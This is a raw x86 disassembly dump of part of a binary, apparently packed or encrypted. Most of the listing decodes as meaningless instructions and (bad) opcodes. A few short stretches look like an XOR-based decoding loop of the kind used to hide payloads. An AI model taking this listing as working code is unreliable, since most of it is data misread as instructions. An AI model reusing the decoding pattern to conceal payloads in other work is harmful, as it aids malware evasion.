  405a74:	fimul  WORD PTR [ecx]
  405a76:	inc    eax
  405a77:	xor    BYTE PTR [edx+0x34],0x67
  405a7b:	cmp    edx,DWORD PTR ds:0x3544fed3
  405a81:	xchg   esi,eax
  405a82:	push   0x55
  405a84:	mov    eax,0xb2c9d6cc
  405a89:	adc    eax,0xd22584c1
  405a8e:	add    bl,BYTE PTR [ecx]
  405a90:	test   al,0x7f
  405a92:	test   al,0x5a
  405a94:	stos   DWORD PTR es:[edi],eax
  405a95:	jmp    0xada1:0xf443fb2d
  405a9c:	fst    QWORD PTR [ecx+0xd]
  405a9f:	and    BYTE PTR [ebp+0x196cf499],0x57
  405aa6:	push   esp
  405aa7:	and    al,0xfe
  405aa9:	sub    DWORD PTR [esi+0x49],esp
  405aac:	clc    
  405aad:	cld    
  405aae:	out    0x8f,al
  405ab0:	jmp    0x405b1e
  405ab2:	cmp    edx,eax
  405ab4:	or     ebp,DWORD PTR [ebp+0x7c668a70]
  405aba:	pop    eax
  405abb:	mov    ds:0x37b82dda,al
  405ac0:	jge    0x405afc
  405ac2:	into   
  405ac3:	dec    esi
  405ac4:	icebp  
  405ac5:	push   eax
  405ac6:	mov    esp,0x672e0bb7
  405acb:	add    BYTE PTR [ebp+0x78],0xd
  405acf:	test   ebp,0xbbb031fe
  405ad5:	cld    
  405ad6:	dec    esi
  405ad7:	pop    esi
  405ad8:	dec    edx
  405ad9:	push   cs
  405ada:	mov    gs,edi
  405adc:	jecxz  0x405abd
  405ade:	test   eax,0xf5aa0e90
  405ae3:	out    dx,al
  405ae4:	or     esp,0x1f
  405ae7:	jp     0x405b47
  405ae9:	mul    esi
  405aeb:	cld    
  405aec:	enter  0xc6c1,0xf8
  405af0:	pop    esp
  405af1:	addr16 sbb eax,0xfc21c9a2
  405af7:	pop    edx
  405af8:	and    dh,ch
  405afa:	xchg   ecx,edi
  405afc:	fldcw  WORD PTR [edx-0x63fc4cec]
  405b02:	pop    esp
  405b03:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  405b05:	arpl   bx,cx
  405b07:	xor    eax,DWORD PTR [esi+0x35]
  405b0a:	pop    esi
  405b0b:	mov    bh,0x2c
  405b0d:	cmc    
  405b0e:	je     0x405b64
  405b10:	dec    edi
  405b11:	sbb    DWORD PTR [edi],eax
  405b13:	push   eax
  405b14:	out    dx,al
  405b15:	fdivr  DWORD PTR ds:0xe68b19a8
  405b1b:	ins    BYTE PTR es:[edi],dx
  405b1c:	sub    ecx,DWORD PTR [ebx]
  405b1e:	cld    
  405b1f:	xchg   edx,eax
  405b20:	xchg   al,dh
  405b22:	(bad)  
  405b23:	icebp  
  405b24:	(bad)
  405b27:	jns    0x405b5b
  405b29:	repz push ebx
  405b2b:	pop    eax
  405b2c:	jo     0x405b90
  405b2e:	cmc    
  405b2f:	test   al,0xe3
  405b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b32:	(bad)  
  405b33:	dec    ebx
  405b34:	inc    eax
  405b35:	fcom   DWORD PTR [edi-0x35]
  405b38:	mov    dl,0x7
  405b3a:	retf   
  405b3b:	fisttp DWORD PTR [eax+eax*4-0x2]
  405b3f:	add    eax,0x4d58277d
  405b44:	call   0xe27a78bc
  405b49:	leave  
  405b4a:	inc    esi
  405b4b:	mov    BYTE PTR [esi],dh
  405b4d:	int    0xcb
  405b4f:	mov    ecx,0x1d0f529
  405b54:	(bad)  
  405b55:	mov    edx,0x5d118fd6
  405b5a:	jmp    0xd109:0x91f4897c
  405b61:	pusha  
  405b62:	(bad)  
  405b63:	fst    DWORD PTR [ebp-0x3a7854fb]
  405b69:	bound  ebp,QWORD PTR [eax]
  405b6b:	jbe    0x405bbf
  405b6d:	xchg   cl,ch
  405b6f:	das    
  405b70:	gs pop esp
  405b72:	dec    edx
  405b73:	sar    DWORD PTR [ecx],1
  405b75:	(bad)  
  405b76:	(bad)  
  405b77:	rcr    DWORD PTR [eax+0x217faa4d],cl
  405b7d:	dec    BYTE PTR [eax+0x6c9359dd]
  405b83:	popa   
  405b84:	xor    al,0x30
  405b86:	lods   al,BYTE PTR ds:[esi]
  405b87:	push   es
  405b88:	inc    DWORD PTR [ebx+ebx*2]
  405b8b:	inc    ecx
  405b8c:	aad    0xa9
  405b8e:	adc    esp,eax
  405b90:	or     eax,0x48d88129
  405b95:	or     BYTE PTR [esp+edx*4-0x4b],0x2d
  405b9a:	xor    ah,bl
  405b9c:	and    al,0x58
  405b9e:	popf   
  405b9f:	adc    dh,BYTE PTR [ebx+ebp*4+0x2e]
  405ba3:	pop    edi
  405ba4:	jge    0x405bfb
  405ba6:	mov    ch,0x69
  405ba8:	jmp    FWORD PTR [eax+0x39]
  405bab:	call   0x5609:0xa8c85a62
  405bb2:	xlat   BYTE PTR ds:[ebx]
  405bb3:	push   eax
  405bb4:	js     0x405b48
  405bb6:	mov    eax,0x3d007566
  405bbb:	jge    0x405bf1
  405bbd:	xor    esi,edx
  405bbf:	jmp    0x405b8c
  405bc1:	in     eax,dx
  405bc2:	pop    ds
  405bc3:	push   DWORD PTR [edx+0x73]
  405bc6:	push   cs
  405bc7:	loop   0x405baf
  405bc9:	ins    BYTE PTR es:[edi],dx
  405bca:	add    edx,esp
  405bcc:	ret    0xec87
  405bcf:	in     eax,0x31
  405bd1:	jb     0x405bdf
  405bd3:	lahf   
  405bd4:	push   ss
  405bd5:	in     eax,0xa7
  405bd7:	cmp    BYTE PTR [esi-0x79],dh
  405bda:	fsubr  st(1),st
  405bdc:	xor    edi,edx
  405bde:	ds pop ds
  405be0:	push   esp
  405be1:	imul   eax,ebp,0x59
  405be4:	ds jmp 0x4106:0x5c7ecf86
  405bec:	(bad)  
  405bee:	scas   eax,DWORD PTR es:[edi]
  405bef:	push   esi
  405bf0:	jmp    0xea07:0x6fd00f58
  405bf7:	jno    0x405bef
  405bf9:	mov    ebp,0x332ffb53
  405bfe:	jno    0x405bfc
  405c00:	inc    esi
  405c01:	xor    eax,0x51ba5252
  405c06:	fwait
  405c07:	dec    esp
  405c08:	test   BYTE PTR [ebx],0x15
  405c0b:	aas    
  405c0c:	jmp    0xf86c1429
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x275d0ed0,dx
  405c45:	xor    al,0xc2
  405c47:	mov    WORD PTR [eax+0x3b],ss
  405c4a:	jle    0x405cca
  405c4c:	mov    ebp,0x567e7e71
  405c51:	shl    DWORD PTR [edi-0x2792c3a4],0xe0
  405c58:	push   0x9268569a
  405c5d:	cwde   
  405c5e:	sbb    ecx,esp
  405c60:	fmul   QWORD PTR [edx]
  405c62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c63:	xor    ah,dh
  405c65:	pop    edx
  405c66:	xchg   ebp,eax
  405c67:	loope  0x405c21
  405c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c6a:	ror    esp,1
  405c6c:	push   esp
  405c6d:	pop    ecx
  405c6e:	mov    DWORD PTR [edx+0x4b5030a4],0xf81a575e
  405c78:	stos   DWORD PTR es:[edi],eax
  405c79:	imul   edx,edx,0x3
  405c7c:	dec    edi
  405c7d:	fistp  WORD PTR [edi-0x4]
  405c80:	or     eax,0x2f884625
  405c85:	fs xchg ebp,eax
  405c87:	xchg   esp,eax
  405c88:	mov    edi,0x758d65ba
  405c8d:	and    DWORD PTR [eax],0xdd05d8c5
  405c93:	(bad)  
  405c94:	fadd   DWORD PTR [esi-0x3f]
  405c97:	leave  
  405c98:	push   es
  405c99:	in     eax,0x8
  405c9b:	push   edx
  405c9c:	out    dx,eax
  405c9d:	mov    ds,WORD PTR [edx+0x695b3f1c]
  405ca3:	sub    ch,BYTE PTR [ebx-0xb369282]
  405ca9:	adc    al,BYTE PTR [ebx+ebp*4+0x4114391b]
  405cb0:	lods   eax,DWORD PTR ds:[esi]
  405cb1:	sbb    BYTE PTR ds:0xaa3312f1,bh
  405cb7:	or     ebx,DWORD PTR [ebp+0xcc25ef3]
  405cbd:	call   0x990a20d9
  405cc2:	das    
  405cc3:	and    dh,BYTE PTR [eax]
  405cc5:	cmp    bl,BYTE PTR [ecx-0x3ff84724]
  405ccb:	in     eax,dx
  405ccc:	in     eax,dx
  405ccd:	je     0x405cfe
  405ccf:	std    
  405cd0:	jmp    0x405cca
  405cd2:	sbb    BYTE PTR [edi],cl
  405cd4:	daa    
  405cd5:	popf   
  405cd6:	(bad)  
  405cd7:	fcomp  DWORD PTR [ecx-0x36774dfc]
  405cdd:	leave  
  405cde:	jg     0x405d29
  405ce0:	daa    
  405ce1:	inc    ebx
  405ce2:	jecxz  0x405d5e
  405ce4:	adc    al,0x90
  405ce6:	sbb    ecx,DWORD PTR [edx-0x53]
  405ce9:	ins    DWORD PTR es:[edi],dx
  405cea:	or     eax,0x5eb51111
  405cef:	nop
  405cf0:	(bad)  [ebp+ebp*4+0x14]
  405cf4:	test   eax,0x52410cf0
  405cf9:	push   esp
  405cfa:	cmp    al,0x1b
  405cfc:	sub    esp,DWORD PTR [edx-0x2f]
  405cff:	push   ds
  405d00:	sti    
  405d01:	inc    edi
  405d02:	fwait
  405d03:	loop   0x405d25
  405d05:	xchg   esp,eax
  405d06:	jp     0x405cfe
  405d08:	daa    
  405d09:	mov    esp,0xf2451734
  405d0e:	and    dl,BYTE PTR [ebp+0x25acbfa]
  405d14:	or     esp,DWORD PTR [ebp-0x50c4441f]
  405d1a:	pop    ss
  405d1b:	(bad)  
  405d1c:	mov    edx,0xfb2f8f3a
  405d21:	xor    eax,0xb94968fe
  405d26:	adc    eax,0x2d563d44
  405d2b:	sbb    dl,al
  405d2d:	cli    
  405d2e:	mov    dl,BYTE PTR [edx+0x1e80f499]
  405d34:	sahf   
  405d35:	sub    BYTE PTR [ebx+0x75],ah
  405d38:	cmp    DWORD PTR ds:0x7738,ebp
  405d3d:	outs   dx,BYTE PTR ds:[esi]
  405d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d3f:	xor    al,0xf4
  405d41:	dec    ebx
  405d42:	inc    ebx
  405d43:	test   eax,0x7e8cab6b
  405d48:	push   edx
  405d49:	(bad)
  405d4d:	jmp    0xa4bc:0x5ce2c948
  405d54:	jle    0x405d2f
  405d56:	dec    esp
  405d57:	inc    esp
  405d58:	sub    dl,BYTE PTR [edx+0x1c]
  405d5b:	or     DWORD PTR ds:0xfb58ada9,edi
  405d61:	test   DWORD PTR [eax-0x5822d570],ecx
  405d67:	retfw  0xeea0
  405d6b:	bound  ecx,QWORD PTR [edx-0x3f3c41ca]
  405d71:	add    eax,0x19dad824
  405d76:	sub    BYTE PTR [ebp+0x5e],dh
  405d79:	aas    
  405d7a:	pop    ebp
  405d7b:	adc    ebx,DWORD PTR [edi+0x63]
  405d7e:	jno    0x405daf
  405d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d81:	jne    0x405da1
  405d83:	in     al,dx
  405d84:	sub    cl,bl
  405d86:	je     0x405dd0
  405d88:	in     eax,0x3b
  405d8a:	fisttp DWORD PTR [ecx-0x52]
  405d8d:	pop    ebx
  405d8e:	add    DWORD PTR [ecx-0x5c],eax
  405d91:	dec    ebx
  405d92:	xchg   ebx,eax
  405d93:	mul    BYTE PTR [ecx-0x60]
  405d96:	test   al,0x71
  405d98:	in     al,0xce
  405d9a:	sbb    eax,0x18e9863d
  405d9f:	test   al,0x48
  405da1:	je     0x405d70
  405da3:	mov    ah,0x89
  405da5:	xchg   edi,eax
  405da6:	das    
  405da7:	jmp    0x4307:0x76b539f8
  405dae:	pop    edx
  405daf:	jne    0x405d94
  405db1:	inc    ebx
  405db2:	div    BYTE PTR [esi-0x1ae27a1d]
  405db8:	not    DWORD PTR [ecx]
  405dba:	js     0x405d46
  405dbc:	cld    
  405dbd:	fadd   st(0),st
  405dbf:	ss sahf 
  405dc1:	mov    dh,0xd1
  405dc3:	stos   BYTE PTR es:[edi],al
  405dc4:	mov    cl,0x58
  405dc6:	and    al,0x26
  405dc8:	mov    dl,0xf2
  405dca:	bnd je 0x405e3a
  405dcd:	jae    0x405e05
  405dcf:	cwde   
  405dd0:	xchg   esi,eax
  405dd1:	ret    
  405dd2:	ds ret 
  405dd4:	jl     0x405d97
  405dd6:	shl    BYTE PTR [edi+0x51],cl
  405dd9:	fwait
  405dda:	sahf   
  405ddb:	jb     0x405dc7
  405ddd:	ins    DWORD PTR es:[edi],dx
  405dde:	push   0x1d
  405de0:	push   es
  405de1:	and    al,0xbc
  405de3:	ds adc al,0xc1
  405de6:	jle    0x405e1b
  405de8:	jns    0x405dc3
  405dea:	fsubr  DWORD PTR [edi]
  405dec:	rcr    DWORD PTR [edi-0x15944ce6],0x5e
  405df3:	dec    DWORD PTR [ebx-0x69]
  405df6:	scas   al,BYTE PTR es:[edi]
  405df7:	adc    DWORD PTR [esi-0x69],ecx
  405dfa:	lahf   
  405dfb:	sub    ch,BYTE PTR [esi+0x78]
  405dfe:	xadd   DWORD PTR [ebp+0x734f9063],esp
  405e05:	ret    
  405e06:	dec    esp
  405e07:	(bad)  
  405e08:	(bad)  
  405e09:	not    DWORD PTR [ecx]
  405e0b:	mov    bl,0x60
  405e0d:	loope  0x405df4
  405e0f:	adc    al,0x8f
  405e11:	pop    ss
  405e12:	adc    DWORD PTR [ebp+edi*8+0x5349c4f5],edx
  405e19:	xor    edi,edx
  405e1b:	mov    dh,0x1c
  405e1d:	fidivr DWORD PTR [ebx-0x2065235]
  405e23:	jmp    0xbe8566a0
  405e28:	or     BYTE PTR [ebx+0x55],bl
  405e2b:	sub    ch,BYTE PTR [ecx]
  405e2d:	mov    esp,0x7b170d75
  405e32:	stos   BYTE PTR es:[edi],al
  405e33:	add    eax,0x410ff3a8
  405e38:	add    al,0x48
  405e3a:	cmp    BYTE PTR [ebx+0x364f4277],0xe
  405e41:	and    ecx,esi
  405e43:	xlat   BYTE PTR ds:[ebx]
  405e44:	aad    0x5b
  405e46:	mov    eax,ds:0x43b1b4e
  405e4b:	jp     0x405e23
  405e4d:	dec    eax
  405e4e:	dec    ecx
  405e4f:	nop
  405e50:	retf   0xa07d
  405e53:	add    ah,BYTE PTR [ebx+0x28]
  405e56:	dec    ebx
  405e57:	add    edx,DWORD PTR [ebx-0x53]
  405e5a:	sub    DWORD PTR [ecx-0x38],esi
  405e5d:	mov    ds:0x5040a587,al
  405e62:	inc    ecx
  405e63:	adc    eax,0xa42bddc0
  405e68:	daa    
  405e69:	sub    bl,cl
  405e6b:	addr16 push 0x57
  405e6e:	and    BYTE PTR [ebx],bl
  405e70:	inc    esp
  405e71:	dec    ebp
  405e72:	fldenv [edx+0x7e]
  405e75:	arpl   ax,sp
  405e77:	imul   DWORD PTR [esi-0x55a0a59e]
  405e7d:	(bad)
  405e80:	icebp  
  405e81:	mov    eax,edi
  405e83:	dec    edx
  405e84:	test   al,0xed
  405e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e87:	je     0x405edd
  405e89:	and    ch,0xdf
  405e8c:	in     eax,dx
  405e8d:	mov    ebx,0x34158901
  405e92:	rol    DWORD PTR [ebp-0x4987beaf],1
  405e98:	lods   al,BYTE PTR ds:[esi]
  405e99:	inc    edx
  405e9a:	and    bl,BYTE PTR [ebx]
  405e9c:	je     0xeca8942f
  405ea2:	fcmovb st,st(7)
  405ea4:	jmp    0x89a:0x1cb7ee3b
  405eab:	sub    esp,DWORD PTR [ebx+edi*4]
  405eae:	lds    edx,FWORD PTR [ebp-0x7e]
  405eb1:	aaa    
  405eb2:	mov    edi,DWORD PTR [ebp-0xe605e33]
  405eb8:	jns    0x405e92
  405eba:	cmp    DWORD PTR [eax-0x3e],ebx
  405ebd:	imul   eax,ebx,0x87ee98d0
  405ec3:	fisubr WORD PTR [ecx+edi*8-0x53]
  405ec7:	outs   dx,BYTE PTR ds:[esi]
  405ec8:	ss pop esi
  405eca:	aam    0x7f
  405ecc:	xchg   edi,eax
  405ecd:	sub    al,0xc7
  405ecf:	outs   dx,BYTE PTR ds:[esi]
  405ed0:	popf   
  405ed1:	xchg   ebp,eax
  405ed2:	imul   BYTE PTR [edx+0x40e74df4]
  405ed8:	rcl    BYTE PTR [edi-0x3d],0xf2
  405edc:	pop    edx
  405edd:	jl     0x405f32
  405edf:	adc    DWORD PTR [eax-0x249bca20],ebx
  405ee5:	fstp   QWORD PTR [edx+0x22]
  405ee8:	adc    eax,0x3d0c4a52
  405eed:	out    0xee,eax
  405eef:	mov    BYTE PTR ds:0x8af611a9,dh
  405ef5:	mov    ecx,esp
  405ef7:	push   ds
  405ef8:	push   ecx
  405ef9:	inc    ecx
  405efa:	gs dec ebp
  405efc:	lahf   
  405efd:	test   al,0x1e
  405eff:	sbb    DWORD PTR [eax-0x6d],ebp
  405f02:	jp     0x405f51
  405f04:	(bad)  
  405f05:	repnz lea edi,[eax+0x10]
  405f09:	mov    edi,DWORD PTR [esp+edi*2+0x58a95fa]
  405f10:	jo     0x405f66
  405f12:	ds aam 0x66
  405f15:	mov    eax,0x2ead6378
  405f1a:	or     DWORD PTR [esi],edx
  405f1c:	adc    al,bl
  405f1e:	mov    eax,eax
  405f20:	and    BYTE PTR [esi],bh
  405f22:	mov    dh,0xfd
  405f24:	(bad)  
  405f25:	sub    eax,0x68a829c6
  405f2a:	fnsave ds:0xe08192b3
  405f30:	sahf   
  405f31:	add    BYTE PTR [ebp+0x1ceb1fdf],ah
  405f37:	sbb    al,0x7a
  405f39:	jb     0x405fa1
  405f3b:	xlat   BYTE PTR ds:[ebx]
  405f3c:	mov    ds:0xb258965b,eax
  405f41:	sbb    ch,BYTE PTR [edx]
  405f43:	jp     0x405f0d
  405f45:	aas    
  405f46:	add    DWORD PTR [edx-0x775bf4ad],0x8e56effb
  405f50:	jmp    0x405f5c
  405f52:	lods   eax,DWORD PTR ds:[esi]
  405f53:	fistp  DWORD PTR [edi-0x5b67e9f7]
  405f59:	jmp    0x23be81fb
  405f5e:	in     eax,0xa5
  405f60:	push   0x317ffdd1
  405f65:	or     ch,BYTE PTR [ebp+ecx*8+0x65]
  405f69:	push   0x32e6357b
  405f6e:	icebp  
  405f6f:	sbb    eax,0x2542aa3b
  405f74:	gs add eax,0xdf3abe20
  405f7a:	hlt    
  405f7b:	mov    eax,ds:0x7c79f3c7
  405f80:	or     eax,0xf993b4c9
  405f85:	enter  0xd4ca,0x92
  405f89:	inc    eax
  405f8a:	int    0x58
  405f8c:	push   ebx
  405f8d:	pop    eax
  405f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f8f:	jle    0x405fc9
  405f91:	mov    bh,0x48
  405f93:	xor    ch,ch
  405f95:	je     0x405fb2
  405f97:	(bad)  
  405f99:	push   ebx
  405f9a:	pop    esp
  405f9b:	mov    esp,0x50bdee82
  405fa0:	repnz add DWORD PTR [ecx-0x2ec57a3c],0xffffffba
  405fa8:	push   edi
  405fa9:	fild   DWORD PTR [ebx-0x1e526153]
  405faf:	sbb    al,0x6c
  405fb1:	pop    ebp
  405fb2:	lahf   
  405fb3:	fild   DWORD PTR [edi+0x2bf57eb2]
  405fb9:	inc    esi
  405fba:	cmp    esi,DWORD PTR [ebx]
  405fbc:	or     BYTE PTR ds:[ebx+ebx*1-0x11],cl
  405fc1:	mov    ebp,0xc9dbe90c
  405fc6:	adc    BYTE PTR [edi-0x20],al
  405fc9:	xor    al,BYTE PTR [edx-0x4]
  405fcc:	aas    
  405fcd:	cli    
  405fce:	iret   
  405fcf:	lahf   
  405fd0:	mov    esp,ecx
  405fd2:	stos   DWORD PTR es:[edi],eax
  405fd3:	ret    0x9b8
  405fd6:	pop    ebp
  405fd7:	xor    dh,BYTE PTR [eax+0x6e]
  405fda:	xor    eax,0xb66bf90f
  405fdf:	scas   al,BYTE PTR es:[edi]
  405fe0:	push   esi
  405fe1:	dec    edi
  405fe2:	mov    bl,BYTE PTR [edi+0x691564cf]
  405fe8:	stc    
  405fe9:	xchg   ebp,eax
  405fea:	sti    
  405feb:	mov    ecx,0x380ad86b
  405ff0:	pop    ebx
  405ff1:	jmp    0x406008
  405ff3:	orps   xmm0,XMMWORD PTR [esi]
  405ff6:	push   edi
  405ff7:	dec    eax
  405ff8:	js     0x405f9d
  405ffa:	pop    ebp
  405ffb:	sub    BYTE PTR [esi],ah
  405ffd:	inc    eax
  405ffe:	out    dx,al
  405fff:	or     eax,0x24603967
  406004:	sbb    ecx,DWORD PTR [eax-0x78]
  406007:	adc    eax,0x844918cb
  40600c:	into   
  40600d:	sub    eax,0x8bfe0334
  406012:	jne    0x40601c
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	jmp    0xa00f321f
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0xca7e7e71
  406063:	popf   
  406064:	cmp    esp,ecx
  406066:	jmp    0x1e38fd90
  40606b:	int3   
  40606c:	jg     0x40603d
  40606e:	or     esp,0x3d6e0f5f
  406074:	add    al,0x22
  406076:	push   eax
  406077:	push   es
  406078:	jne    0x406087
  40607a:	pop    eax
  40607b:	mov    edx,0xda04deab
  406080:	mov    cl,bh
  406082:	ja     0x406080
  406084:	fs out dx,al
  406086:	or     al,0x46
  406088:	xlat   BYTE PTR ds:[ebx]
  406089:	mov    esp,0x389ffb5a
  40608e:	fild   QWORD PTR [edi]
  406090:	ret    0xea84
  406093:	dec    esi
  406094:	dec    ebx
  406095:	mov    al,ds:0xd3ec1638
  40609a:	icebp  
  40609b:	cli    
  40609c:	mov    al,ds:0x949679b3
  4060a1:	mov    esi,0xa8f4278a
  4060a6:	mov    cl,0x90
  4060a8:	push   es
  4060a9:	xchg   ecx,eax
  4060aa:	pop    esp
  4060ab:	gs inc ecx
  4060ad:	addr16 cmp dl,cl
  4060b0:	iret   
  4060b1:	xchg   ebp,eax
  4060b2:	pop    edi
  4060b3:	xor    eax,0x2db96648
  4060b8:	jo     0x40605c
  4060ba:	mov    ds:0x60c4be32,eax
  4060bf:	iret   
  4060c0:	jno    0x4060aa
  4060c2:	out    dx,eax
  4060c3:	sub    BYTE PTR [ebx],dh
  4060c5:	xlat   BYTE PTR ds:[ebx]
  4060c6:	lea    edx,[ecx-0x30]
  4060c9:	push   ds
  4060ca:	or     eax,DWORD PTR [ebx+edi*2]
  4060cd:	fild   QWORD PTR [ecx-0x34]
  4060d0:	call   0xe96f1f3b
  4060d5:	pop    ebx
  4060d6:	std    
  4060d7:	(bad)  
  4060d8:	xchg   esp,eax
  4060d9:	test   eax,0x8e98e79a
  4060de:	pop    esi
  4060df:	mov    ecx,0xc3232b59
  4060e4:	jnp    0x406158
  4060e6:	in     eax,dx
  4060e7:	pop    edi
  4060e8:	(bad)  [eax]
  4060ea:	add    eax,0xe01cb743
  4060ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060f0:	jo     0x406160
  4060f2:	fwait
  4060f3:	xor    eax,0xddb35324
  4060f8:	mov    eax,ds:0xd8162d5
  4060fd:	inc    ebx
  4060fe:	mov    dh,0xbf
  406100:	cwde   
  406101:	outs   dx,BYTE PTR ds:[esi]
  406102:	out    dx,eax
  406103:	test   al,0xd1
  406105:	pop    edx
  406106:	out    0xc0,al
  406108:	and    al,0x9f
  40610a:	or     ah,bl
  40610c:	cwde   
  40610d:	and    DWORD PTR [ebx-0x9],esi
  406110:	xor    cl,ah
  406112:	mov    BYTE PTR [ebx-0x23e90bb4],bh
  406118:	out    0xdb,al
  40611a:	xchg   esi,eax
  40611b:	or     al,0xa7
  40611d:	adc    al,0x99
  40611f:	repz push ds
  406121:	mov    dh,0xf0
  406123:	in     eax,0x97
  406125:	jae    0x4060d8
  406127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406128:	int    0x12
  40612a:	int    0x9
  40612c:	push   esp
  40612d:	xchg   ecx,eax
  40612e:	push   0x73
  406130:	aaa    
  406131:	xor    DWORD PTR [edx+0x6f],esp
  406134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406135:	hlt    
  406136:	xlat   BYTE PTR ds:[ebx]
  406137:	enter  0xde43,0x3c
  40613b:	mov    cl,0x8e
  40613d:	int3   
  40613e:	pop    ss
  40613f:	dec    esp
  406140:	popa   
  406141:	mov    bl,0xea
  406143:	or     DWORD PTR [ebp+0x4eda8484],ebp
  406149:	(bad)  
  40614a:	adc    dl,ah
  40614c:	pop    edx
  40614d:	test   DWORD PTR [edx-0x118ff13],0xe2f1ba63
  406157:	dec    edx
  406158:	push   ebx
  406159:	mov    DWORD PTR [edi],0x1f0cdf87
  40615f:	mov    eax,0x169f25f1
  406164:	ss jg  0x4061b9
  406167:	outs   dx,BYTE PTR ds:[esi]
  406168:	jecxz  0x4061b9
  40616a:	lods   eax,DWORD PTR ds:[esi]
  40616b:	dec    eax
  40616c:	sbb    ebx,DWORD PTR [esi]
  40616e:	mov    esi,0xac929ce2
  406173:	das    
  406174:	mov    ds:0x38470b0d,al
  406179:	push   ebx
  40617a:	xchg   al,ah
  40617c:	data16 jne 0x406112
  40617f:	ds dec ebx
  406181:	xor    edx,DWORD PTR [eax+0x1a]
  406184:	mov    gs,edx
  406186:	ficom  DWORD PTR [edx+0x7e]
  406189:	pop    eax
  40618a:	dec    ebp
  40618b:	push   cs
  40618c:	or     BYTE PTR [edx-0x58],0x9a
  406190:	sbb    eax,0xdcc4a71a
  406195:	outs   dx,BYTE PTR ds:[esi]
  406196:	mov    bl,0x9f
  406198:	inc    edx
  406199:	push   ss
  40619a:	cmp    eax,0x26df31c0
  40619f:	lock mov bl,BYTE PTR [eax]
  4061a2:	cmovnp edx,edx
  4061a5:	sub    BYTE PTR [ebx+0x52],0x29
  4061a9:	(bad)  [ecx+esi*1]
  4061ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061ad:	aad    0x2d
  4061af:	xlat   BYTE PTR ds:[ebx]
  4061b0:	xchg   edi,eax
  4061b1:	inc    esp
  4061b2:	loope  0x4061cf
  4061b4:	dec    ebx
  4061b5:	jns    0x406204
  4061b7:	xlat   BYTE PTR ds:[ebx]
  4061b8:	dec    ecx
  4061b9:	xor    bl,dh
  4061bb:	push   edi
  4061bc:	in     al,0xa9
  4061be:	jg     0x406141
  4061c0:	mov    dh,ch
  4061c2:	arpl   bx,di
  4061c4:	fisttp QWORD PTR [edi+0x48]
  4061c7:	pop    ebp
  4061c8:	sbb    bh,0xe8
  4061cb:	jbe    0x4061f8
  4061cd:	and    al,0x10
  4061cf:	jp     0x40618c
  4061d1:	xor    BYTE PTR [ebp-0x6503f45],dh
  4061d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061d8:	shl    ah,0x91
  4061db:	stc    
  4061dc:	test   al,0x2
  4061de:	lds    ebx,FWORD PTR [ebx+ebp*1-0x5e0caefd]
  4061e5:	shr    DWORD PTR ds:0x39bf883b,0x89
  4061ec:	imul   DWORD PTR [edx]
  4061ee:	nop
  4061ef:	sbb    al,BYTE PTR [ecx-0x78]
  4061f2:	push   esi
  4061f3:	cmp    DWORD PTR [esi-0x74892378],edx
  4061f9:	mov    esp,0x12328e36
  4061fe:	xor    BYTE PTR [eax+0x4a],dh
  406201:	daa    
  406202:	in     al,dx
  406203:	add    ah,BYTE PTR [esi-0x19767a19]
  406209:	mov    dl,0x12
  40620b:	fidivr DWORD PTR [edx+ebp*1]
  40620e:	ins    DWORD PTR es:[edi],dx
  40620f:	adc    dh,0x7f
  406212:	fwait
  406213:	jbe    0x406206
  406215:	inc    eax
  406216:	aas    
  406217:	and    eax,0xd3478a1b
  40621c:	jle    0x406228
  40621e:	daa    
  40621f:	je     0x4061eb
  406221:	or     ch,BYTE PTR [esi-0xda0ca96]
  406227:	mov    dh,0xc5
  406229:	div    DWORD PTR [edi-0x1ca06f69]
  40622f:	je     0x4061fe
  406231:	mov    ebp,0x3bc3de9f
  406236:	std    
  406237:	shl    DWORD PTR [eax-0x3e],1
  40623a:	pop    es
  40623b:	sbb    bl,cl
  40623d:	int3   
  40623e:	addr16 sub al,0x6c
  406241:	mov    DWORD PTR [eax+0x5da49c8f],edi
  406247:	ins    BYTE PTR es:[edi],dx
  406248:	jae    0x4062c9
  40624a:	cmp    ebp,edx
  40624c:	mov    esp,0x837efbe0
  406251:	mov    eax,ds:0xd02aa34a
  406256:	jo     0x40626c
  406258:	push   esp
  406259:	add    DWORD PTR [esi],edi
  40625b:	stc    
  40625c:	adc    DWORD PTR [edx+0x44],0xffffffef
